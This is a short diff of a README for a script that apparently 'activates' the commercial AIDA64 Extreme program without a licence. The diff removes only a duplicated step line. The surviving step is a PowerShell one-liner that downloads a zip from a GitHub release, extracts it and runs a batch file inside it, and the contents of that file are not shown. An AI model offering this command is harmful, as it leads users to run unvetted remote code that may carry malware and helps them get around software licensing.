@@ -15,9 +15,6 @@ This script simplifies the process of activating AIDA64 Extreme by automating th
 
 2. Run the following command in PowerShell to download and execute the activation script:
 
-
-2. Run the following command in PowerShell to download and execute the activation script:
-
    ```powershell
    irm https://github.com/SomeMedic/thesaintaida/releases/download/alpha-1.0.2/TheSaintAida.zip -OutFile TheSaintAida.zip; Expand-Archive TheSaintAida.zip -DestinationPath . -Force; cmd.exe /c .\TheSaintAida\script.bat
    ```
